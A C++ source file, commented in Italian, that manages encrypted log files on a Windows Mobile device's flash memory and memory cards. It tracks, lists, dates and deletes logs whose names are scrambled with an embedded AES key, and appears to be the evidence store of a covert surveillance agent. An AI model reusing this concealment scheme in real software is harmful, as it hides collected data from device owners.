#include "UberLog.h"
#include "FunctionFunc.h"

/**
* La nostra unica reference a UberLog.
*/
UberLog* UberLog::Instance = NULL;
volatile LONG UberLog::lLock = 0;

// Ordina dal piu' vecchio al piu' nuovo
BOOL SortByDate(const LogInfo &lInfo, const LogInfo &rInfo) {
	return lInfo.date.QuadPart < rInfo.date.QuadPart;
}

UberLog* UberLog::self() {
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		_Sleep(1);

	if (Instance == NULL)
		Instance = new(std::nothrow) UberLog();

	InterlockedExchange((LPLONG)&lLock, 0);

	return Instance;
}

UberLog::UberLog() : hUberLogMutex(NULL), encryptionObj(NULL) {
	hUberLogMutex = _CreateMutexW(NULL, FALSE, NULL);

	if (hUberLogMutex == NULL)
		return;

	uberMap.clear();
	treeVector.reserve(10);

	encryptionObj = new(std::nothrow) Encryption(g_AesKey, KEY_LEN);

	if (encryptionObj == NULL) {
		CloseHandle(hUberLogMutex);
		return;
	}
}

UberLog::~UberLog() {
	Clear();

	if (encryptionObj)
		delete encryptionObj;

	if (hUberLogMutex != NULL)
		CloseHandle(hUberLogMutex);
}

BOOL UberLog::IsInUse(wstring &strName) {
	HANDLE hFile = INVALID_HANDLE_VALUE;

	if (strName.empty()) {
		DBG_TRACE(L"Debug - UberLog.cpp - IsInUse() FAILED [0]\n", 4, FALSE);
		return FALSE;
	}

	hFile = _CreateFileW(strName.c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		return FALSE;
	}

	return TRUE;
}

// Prende il filetime di un log
BOOL UberLog::GetLogFileTime(wstring &strLogName, FILETIME *ft) {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	WCHAR *pwName;
	wstring strTimeStamp;
	size_t dot;

	if (strLogName.empty()) {
		DBG_TRACE(L"Debug - UberLog.cpp - GetLogFileTime() FAILED [0]\n", 4, FALSE);
		return FALSE;
	}

	// Cerchiamo il timestamp nel nome (scramblato, ma le posizioni non cambiano)
	dot = strLogName.rfind(L".");

	if (dot == wstring::npos) {
		DBG_TRACE(L"Debug - UberLog.cpp - GetLogFileTime() FAILED [1]\n", 4, FALSE);
		return FALSE;
	}

	// 16 = sizeof(FILETIME) * sizeof(WCHAR);
	strTimeStamp.assign(strLogName, dot - 16, 16);

	pwName = encryptionObj->DecryptName(strTimeStamp, g_Challenge[0]);

	if (pwName == NULL) {
		DBG_TRACE(L"Debug - UberLog.cpp - GetLogFileTime() FAILED [2]\n", 4, FALSE);
		return FALSE;
	}

	swscanf(pwName, L"%08x%08x", &ft->dwLowDateTime, &ft->dwHighDateTime);
	free(pwName);
	return TRUE;
}

BOOL UberLog::ScanLogs() {
	WAIT_AND_SIGNAL(hUberLogMutex);
	WCHAR wLogName[] = {L"*.xxx0"};
	wstring strLogMask;

	// Generiamo la search string completa di path ("*.mob")
	ZeroMemory(wLogName, sizeof(wLogName));
	///wprintf_s(wLogName, L"%s%s", L"*", LOG_EXTENSION);
	swprintf_s(wLogName, L"%s%s", L"*", LOG_EXTENSION);
	strLogMask = wLogName;

	// Puliamo la lista dei log
	Clear();

	// Cerchiamo i log sul filesystem
	if (ScanForLogs(strLogMask, GetCurrentPath(LOG_DIR_FORMAT), GetCurrentPath(NULL), FLASH) == FALSE) {
		DBG_TRACE(L"Debug - UberLog.cpp - ScanLogs() FAILED [1]\n", 4, FALSE);
		UNLOCK(hUberLogMutex);
		return FALSE;
	}

	// Cerchiamo i log sulla prima MMC
	if (ScanForLogs(strLogMask, GetFirstMMCPath(LOG_DIR_FORMAT), GetFirstMMCPath(NULL), MMC1) == FALSE) {
		DBG_TRACE(L"Debug - UberLog.cpp - ScanLogs() -> ScanFirstMmc() FAILED [2]\n", 4, FALSE);
	}

	// Cerchiamo i log sulla seconda MMC
	if (ScanForLogs(strLogMask, GetSecondMMCPath(LOG_DIR_FORMAT), GetSecondMMCPath(NULL), MMC2) == FALSE) {
		DBG_TRACE(L"Debug - UberLog.cpp - ScanLogs() -> ScanSecondMmc() FAILED [3]\n", 4, FALSE);
	}

	MakeLogDirs();

	DBG_TRACE(L"Debug - UberLog.cpp - ScanLogs() OK\n", 6, FALSE);
	UNLOCK(hUberLogMutex);
	return TRUE;
}

UINT UberLog::GetLogNum() {
	WAIT_AND_SIGNAL(hUberLogMutex);
	UINT uSize;

	uSize = uberMap.size();

	UNLOCK(hUberLogMutex);
	return uSize;
}

BOOL UberLog::Add(wstring &strName, UINT uLogType, FILETIME ft, UINT uOnMmc) {
	WAIT_AND_SIGNAL(hUberLogMutex);
	UberStruct uber, tUber;
	wstring strLogDir;
	UINT uHash;
	vector<LogTree>::iterator iterTree;

	if (strName.empty()) {
		DBG_TRACE(L"Debug - UberLog.cpp - Add() FAILED [0]\n", 4, FALSE);
		UNLOCK(hUberLogMutex);
		return FALSE;
	}

	uber.strLogName = strName;
	uber.uLogType = uLogType;
	uber.ft.dwHighDateTime = ft.dwHighDateTime;
	uber.ft.dwLowDateTime = ft.dwLowDateTime;
	uber.bInUse = TRUE;
	uber.uOnMmc = uOnMmc;

	// Controlliamo che non sia un duplicato
	uHash = FnvHash((BYTE *)uber.strLogName.c_str(), uber.strLogName.size() * sizeof(WCHAR));

	/*
	// Verifichiamo che questo log non sia gia' nella lista
	tUber = uberMap[uHash];

	if (tUber.strLogName.empty() == FALSE) {
		DBG_TRACE(L"******** Debug - UberLog.cpp - LOG ALREADY IN QUEUE\n", 1, FALSE);
		UNLOCK(hUberLogMutex);
		return FALSE;	
	}*/

	// Log unico, aggiungiamolo
	uberMap[uHash] = uber;

	uHash = GetHashFromFullPath(strName);

	for (iterTree = treeVector.begin(); iterTree != treeVector.end(); iterTree++) {
		if (iterTree->uHash == uHash) {
			iterTree->uLogs++;
			break;
		}
	}
	
	UNLOCK(hUberLogMutex);
	return TRUE;	
}

// Aggiunge un log alla mappa, questa funzione va chiamata SOLO dalla 
// ScanLogs() che a sua volta viene chiamata solo al boot.
BOOL UberLog::Add(UberStruct &uber) {
	WAIT_AND_SIGNAL(hUberLogMutex);
	UberStruct tUber;
	FILETIME ft;

	if (uber.strLogName.empty()) {
		DBG_TRACE(L"Debug - UberLog.cpp - Add() FAILED [0]\n", 4, FALSE);
		UNLOCK(hUberLogMutex);
		return FALSE;
	}

	ZeroMemory(&ft, sizeof(ft));

	uber.bInUse = FALSE;

	if (GetLogFileTime(uber.strLogName, &uber.ft) == FALSE) {
		DBG_TRACE(L"Debug - UberLog.cpp - Add() FAILED [1]\n", 4, FALSE);
		UNLOCK(hUberLogMutex);
		return TRUE;
	}

	// Controlliamo che non sia un duplicato
	UINT uHash = FnvHash((BYTE *)uber.strLogName.c_str(), uber.strLogName.size() * sizeof(WCHAR));

	/*
	// Verifichiamo che questo log non sia gia' nella lista
	tUber = uberMap[uHash];

	// Log gia' inserito nella mappa, saltiamolo
	if (tUber.strLogName.empty() == FALSE) {
		DBG_TRACE(L"Debug - UberLog.cpp - Add() FAILED [Log already in queue]\n", 4, FALSE);
		UNLOCK(hUberLogMutex);
		return FALSE;
	}*/
	
	uberMap[uHash] = uber;

	UNLOCK(hUberLogMutex);
	return TRUE;	
}

// La lista ritornata va liberata dal chiamante
list<LogInfo>* UberLog::ListClosed() {
	WAIT_AND_SIGNAL(hUberLogMutex);
	map<UINT, UberStruct>::iterator iter;
	list<LogInfo> *logInfo;
	LogInfo infoStruct;

	logInfo = new(std::nothrow) list<LogInfo>;

	if (logInfo == NULL) {
		DBG_TRACE(L"Debug - UberLog.cpp - ListClosed() FAILED [1]\n", 4, FALSE);
		UNLOCK(hUberLogMutex);
		return NULL;
	}

	logInfo->clear();

	for (iter = uberMap.begin(); iter != uberMap.end(); iter++) {
		if (iter->second.bInUse)
			continue;

		infoStruct.date.HighPart = iter->second.ft.dwHighDateTime;
		infoStruct.date.LowPart = iter->second.ft.dwLowDateTime;
		infoStruct.strLog = iter->second.strLogName;
		logInfo->push_back(infoStruct);
	}

	logInfo->sort(SortByDate);
	UNLOCK(hUberLogMutex);
	return logInfo;
}

// La lista ritornata va liberata dal chiamante
list<LogInfo>* UberLog::ListClosedByType(UINT uLogType) {
	WAIT_AND_SIGNAL(hUberLogMutex);
	map<UINT, UberStruct>::iterator iter;
	list<LogInfo> *logInfo;
	LogInfo infoStruct;

	logInfo = new(std::nothrow) list<LogInfo>;

	if (logInfo == NULL) {
		DBG_TRACE(L"Debug - UberLog.cpp - ListClosedByType() FAILED [1]\n", 4, FALSE);
		UNLOCK(hUberLogMutex);
		return NULL;
	}

	for (iter = uberMap.begin(); iter != uberMap.end(); iter++) {
		if (iter->second.bInUse || iter->second.uLogType != uLogType)
			continue;

		infoStruct.date.HighPart = iter->second.ft.dwHighDateTime;
		infoStruct.date.LowPart = iter->second.ft.dwLowDateTime;
		infoStruct.strLog = iter->second.strLogName;
		logInfo->push_back(infoStruct);
	}

	logInfo->sort(SortByDate);

	UNLOCK(hUberLogMutex);
	return logInfo;
}

BOOL UberLog::ClearListSnapshot(list<LogInfo> *pSnap) {
	if (pSnap == NULL) {
		return TRUE;
	}

	pSnap->clear();
	delete pSnap;

	return TRUE;
}

// Rimuove un log dalla lista dei log ma SENZA cancellarlo
BOOL UberLog::Remove(wstring &strName, UINT uOnMmc) {
	WAIT_AND_SIGNAL(hUberLogMutex);
	UINT uHash;
	UberStruct uber;

	if (strName.empty()) {
		DBG_TRACE(L"Debug - UberLog.cpp - Remove() FAILED [0]\n", 4, FALSE);
		UNLOCK(hUberLogMutex);
		return FALSE;
	}

	uHash = FnvHash((BYTE *)strName.c_str(), strName.size() * sizeof(WCHAR));
	uber = uberMap[uHash];

	if (uber.uOnMmc == uOnMmc && uber.strLogName.size() /*&& uber.strLogName == strName*/) {
		uberMap.erase(uHash);
		UNLOCK(hUberLogMutex);
		return TRUE;
	}

	DBG_TRACE(L"Debug - UberLog.cpp - Remove() FAILED [1]\n", 4, FALSE);
	UNLOCK(hUberLogMutex);
	return FALSE;
}

// Rimuove un log dalla lista dei log e lo cancella dal filesystem
BOOL UberLog::Delete(wstring &strName) {
	WAIT_AND_SIGNAL(hUberLogMutex);
	vector<LogTree>::iterator iterTree;
	UberStruct uber;
	UINT uHash;

	if (strName.empty()) {
		DBG_TRACE(L"Debug - UberLog.cpp - Delete() FAILED [0]\n", 4, FALSE);
		UNLOCK(hUberLogMutex);
		return FALSE;
	}

	uHash = FnvHash((BYTE *)strName.c_str(), strName.size() * sizeof(WCHAR));
	uber = uberMap[uHash];

	if (uber.strLogName.empty() /*|| uber.strLogName != strName*/) {
		DBG_TRACE(L"Debug - UberLog.cpp - Delete() FAILED [1]\n", 4, FALSE);
		UNLOCK(hUberLogMutex);
		return FALSE;
	}

	DeleteFile(uber.strLogName.c_str());
	uberMap.erase(uHash);

	uHash = GetHashFromFullPath(strName);

	// Aggiorniamo il Log Dir Tree
	for (iterTree = treeVector.begin(); iterTree != treeVector.end(); iterTree++) {
		if (iterTree->uHash != uHash)
			continue;

		iterTree->uLogs--;

		if (iterTree->uLogs == 0) {
			RemoveDirectory(GetLogDirFromFullPath(strName).c_str());
			treeVector.erase(iterTree);
		}

		break;
	}

	UNLOCK(hUberLogMutex);
	return TRUE;
}

// Rimuove tutti i log dalla lista dei log e dal filesystem (tranne quelli eventualmente in uso)
BOOL UberLog::DeleteAll() {
	WAIT_AND_SIGNAL(hUberLogMutex);
	map<UINT, UberStruct>::iterator iter;
	vector<LogTree>::iterator iterTree;

	for (iter = uberMap.begin(); iter != uberMap.end(); ) {
		if (iter->second.bInUse) {
			iter++;
			continue;
		}

		if (DeleteFile(iter->second.strLogName.c_str()) == FALSE) {
			DBG_TRACE(L"Debug - UberLog.cpp - DeleteAll() [DeleteFile() failed] [0]\n", 4, FALSE);
		}

		iter = uberMap.erase(iter);
	}

	for (iterTree = treeVector.begin(); iterTree != treeVector.end(); ) {
		if (RemoveDirectory(iterTree->strDirName.c_str()))
			iterTree = treeVector.erase(iterTree);
		else
			iterTree++;
	}
	UNLOCK(hUberLogMutex);

	ScanLogs();

	WAIT_AND_SIGNAL(hUberLogMutex);
	for (iter = uberMap.begin(); iter != uberMap.end(); ) {
		if (iter->second.bInUse) {
			iter++;
			continue;
		}

		if (DeleteFile(iter->second.strLogName.c_str()) == FALSE) {
			DBG_TRACE(L"Debug - UberLog.cpp - DeleteAll() [DeleteFile() failed] [1]\n", 4, FALSE);
		}

		iter = uberMap.erase(iter);
	}

	for (iterTree = treeVector.begin(); iterTree != treeVector.end(); ) {
		if (RemoveDirectory(iterTree->strDirName.c_str()))
			iterTree = treeVector.erase(iterTree);
		else
			iterTree++;
	}
	UNLOCK(hUberLogMutex);
	return TRUE;
}

// Imposta a FALSE lo stato di utilizzo del log
BOOL UberLog::Close(wstring &strName, BOOL bOnMmc) {
	WAIT_AND_SIGNAL(hUberLogMutex);
	UINT uHash;
	UberStruct uber;

	if (strName.empty()) {
		DBG_TRACE(L"Debug - UberLog.cpp - Close() FAILED [0]\n", 4, FALSE);
		UNLOCK(hUberLogMutex);
		return FALSE;
	}

	uHash = FnvHash((BYTE *)strName.c_str(), strName.size() * sizeof(WCHAR));
	uber = uberMap[uHash];

	if (uber.uOnMmc == (UINT)bOnMmc && uber.strLogName.size() /*&& uber.strLogName == strName*/) {
		uber.bInUse = FALSE;
		uberMap[uHash] = uber;

		UNLOCK(hUberLogMutex);
		return TRUE;
	}

	DBG_TRACE(L"Debug - UberLog.cpp - Close() FAILED [1]\n", 4, FALSE);
	UNLOCK(hUberLogMutex);
	return FALSE;
}

void UberLog::Clear() {
	WAIT_AND_SIGNAL(hUberLogMutex);
	uberMap.clear();
	treeVector.clear();
	UNLOCK(hUberLogMutex);
}

BOOL UberLog::CreateLogDir(wstring &strDirPath, UINT uMmc) {
	FILETIME ft;
	SYSTEMTIME st;
	WCHAR wName[sizeof(FILETIME) * 2 + 1];
	LogTree logTree;

	GetSystemTime(&st);
	SystemTimeToFileTime(&st, &ft);

	swprintf_s(wName, L"%08x%08x", ft.dwLowDateTime, ft.dwHighDateTime);

	logTree.strDirName = strDirPath + LOG_DIR_PREFIX + wName;
	logTree.uHash = FnvHash((BYTE *)logTree.strDirName.c_str(), logTree.strDirName.size() * sizeof(WCHAR));
	logTree.uLogs = 0;
	logTree.uOnMmc = uMmc;

	if (CreateDirectory(logTree.strDirName.c_str(), NULL) == FALSE) {
		DBG_TRACE(L"Debug - UberLog.cpp - CreateLogDir() FAILED [Cannot create directory]\n", 4, FALSE);
		return FALSE;
	}

	treeVector.push_back(logTree);
	return TRUE;
}

void UberLog::MakeLogDirs() {
	vector<LogTree>::iterator treeIter;
	BOOL bCreateFlash, bCreateMMC1, bCreateMMC2;

	bCreateFlash = bCreateMMC1 = bCreateMMC2 = TRUE;

	// Vediamo se dobbiamo creare una nuova cartella per i log
	for (treeIter = treeVector.begin(); treeIter != treeVector.end(); treeIter++) {
		if (treeIter->uLogs < LOG_PER_DIRECTORY && treeIter->uOnMmc == FLASH)
			bCreateFlash = FALSE;

		if (treeIter->uLogs < LOG_PER_DIRECTORY && treeIter->uOnMmc == MMC1)
			bCreateMMC1 = FALSE;

		if (treeIter->uLogs < LOG_PER_DIRECTORY && treeIter->uOnMmc == MMC2)
			bCreateMMC2 = FALSE;
	}

	if (GetCurrentPath(NULL).empty())
		bCreateFlash = FALSE;

	if (GetFirstMMCPath(NULL).empty())
		bCreateMMC1 = FALSE;

	if (GetSecondMMCPath(NULL).empty())
		bCreateMMC2 = FALSE;

	if (bCreateFlash)
		CreateLogDir(GetCurrentPath(NULL), FLASH);

	if (bCreateMMC1)
		CreateLogDir(GetFirstMMCPath(NULL), MMC1);

	if (bCreateMMC2)
		CreateLogDir(GetSecondMMCPath(NULL), MMC2);

	return;
}

BOOL UberLog::ScanForLogs(wstring &strLogMask, wstring &strLogDirFormat, wstring &strSearchPath, UINT uMmc) {
	PWCHAR wEncName;
	WIN32_FIND_DATA wfd;
	HANDLE hList;
	UberStruct uberLog;
	wstring strLocalLog, strEncName;

	if (strLogMask.empty()) {
		DBG_TRACE(L"Debug - UberLog.cpp - ScanForLogs() FAILED [0]\n", 4, FALSE);
		return FALSE;
	}

	// Cifriamo l'estensione dei log
	wEncName = encryptionObj->EncryptName(strLogMask, g_Challenge[0]);

	if (wEncName == NULL) {
		DBG_TRACE(L"Debug - UberLog.cpp - ScanForLogs() FAILED [1]\n", 4, FALSE);
		return FALSE;
	}

	strEncName = wEncName;
	free(wEncName);

	strLocalLog = strLogDirFormat;

	if (strLocalLog.empty()) {
		DBG_TRACE(L"Debug - UberLog.cpp - ScanForLogs() FAILED [2]\n", 4, FALSE);
		return FALSE;
	}

	ZeroMemory(&wfd, sizeof(wfd));

	// Path per la ricerca delle log directory
	hList = _FindFirstFile(strLocalLog.c_str(), &wfd);

	do {
		LogTree logTree;

		if ((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FALSE)
			continue;

		logTree.strDirName = strSearchPath;
		logTree.strDirName += wfd.cFileName; // wfd.cFileName NON contiene il path
		logTree.uHash = FnvHash((BYTE *)logTree.strDirName.c_str(), logTree.strDirName.size() * sizeof(WCHAR));
		logTree.uLogs = ScanDirTree(logTree.strDirName, strEncName);
		logTree.uOnMmc = uMmc;

		treeVector.push_back(logTree);
	} while(FindNextFile(hList, &wfd));

	if (hList != INVALID_HANDLE_VALUE) {
		FindClose(hList);
		hList = INVALID_HANDLE_VALUE;
	}

	return TRUE;
}

UINT UberLog::ScanDirTree(wstring &strSearchPath, wstring &strEncName) {
	WIN32_FIND_DATA wfd;
	HANDLE hList;
	UINT uLogType, uCounter = 0;
	UberStruct uberLog;
	wstring strSearch;

	strSearch = strSearchPath + L"\\" + strEncName;

	ZeroMemory(&wfd, sizeof(wfd));
	hList = _FindFirstFile(strSearch.c_str(), &wfd);

	if (hList == INVALID_HANDLE_VALUE)
		return 0;

	do {
		// wfd.cFileName NON contiene il path ma solo il nome del file
		wstring strcFileName = wfd.cFileName;
		PWCHAR pwPlain = encryptionObj->DecryptName(strcFileName, g_Challenge[0]);

		if (pwPlain == NULL) {
			FindClose(hList);
			DBG_TRACE(L"Debug - UberLog.cpp - ScanDirTree() FAILED [3]\n", 4, FALSE);
			return 0;
		}

		swscanf(pwPlain, L"%04x", &uLogType);
		delete[] pwPlain;

		uberLog.uOnMmc = 0;
		uberLog.uLogType = uLogType;

		uberLog.strLogName = strSearchPath;
		uberLog.strLogName += L"\\";
		uberLog.strLogName += wfd.cFileName;

		// bInUse e ft vengono valorizzati da questa Add()
		if (Add(uberLog))
			uCounter++;
	} while(FindNextFile(hList, &wfd));

	if (hList != INVALID_HANDLE_VALUE) {
		FindClose(hList);
		hList = INVALID_HANDLE_VALUE;
	}

	return uCounter;
}

wstring UberLog::GetAvailableDir(UINT uMmc) {
	WAIT_AND_SIGNAL(hUberLogMutex);
	vector<LogTree>::iterator iterTree;
	wstring strTmp;

	for (iterTree = treeVector.begin(); iterTree != treeVector.end(); iterTree++) {
		if (iterTree->uOnMmc == uMmc && iterTree->uLogs < LOG_PER_DIRECTORY) {
			UNLOCK(hUberLogMutex);
			return iterTree->strDirName;
		}
	}

	MakeLogDirs();

	for (iterTree = treeVector.begin(); iterTree != treeVector.end(); iterTree++) {
		if (iterTree->uOnMmc == uMmc && iterTree->uLogs < LOG_PER_DIRECTORY) {
			UNLOCK(hUberLogMutex);
			return iterTree->strDirName;
		}
	}

	UNLOCK(hUberLogMutex);
	return strTmp;
}

wstring UberLog::GetLogDirFromFullPath(wstring &strFullPath) {
	wstring strLogDir;

	size_t pos = strFullPath.rfind(L"\\");

	if (pos == wstring::npos)
		return L"";

	strLogDir.assign(strFullPath, 0, pos);

	return strLogDir;
}

UINT UberLog::GetHashFromFullPath(wstring &strFullPath) {
	wstring strLogDir = GetLogDirFromFullPath(strFullPath);

	return FnvHash((BYTE *)strLogDir.c_str(), strLogDir.size() * sizeof(WCHAR));
}

// Helper function per stampare il contenuto della lista
void UberLog::Print() {

#ifdef _DEBUG
	WCHAR msg[512];
	WAIT_AND_SIGNAL(hUberLogMutex);
	map<UINT, UberStruct>::iterator iter;
	vector<LogTree>::iterator iterTree;

	for (iterTree = treeVector.begin(); iterTree != treeVector.end(); iterTree++) {
		//wprintf(L"Tree Directory: %s, logs: %d, MMC: %d\n", iterTree->strDirName.c_str(), iterTree->uLogs,iterTree->uOnMmc);
		swprintf_s(msg, L"Tree Directory: %s, logs: %d, MMC: %d\n", iterTree->strDirName.c_str(), iterTree->uLogs,iterTree->uOnMmc);OutputDebugString(msg);
	}

	for (iter = uberMap.begin(); iter != uberMap.end(); iter++) {
		//wprintf(L"File: %s\n", iter->second.strLogName.c_str());
		swprintf_s(msg, L"File: %s\n", iter->second.strLogName.c_str());OutputDebugString(msg);
	}

	//wprintf(L"Dimensione: %d\n", uberMap.size());
	swprintf_s(msg, L"Dimensione: %d\n", uberMap.size());OutputDebugString(msg);
	UNLOCK(hUberLogMutex);
	return;
#endif
}
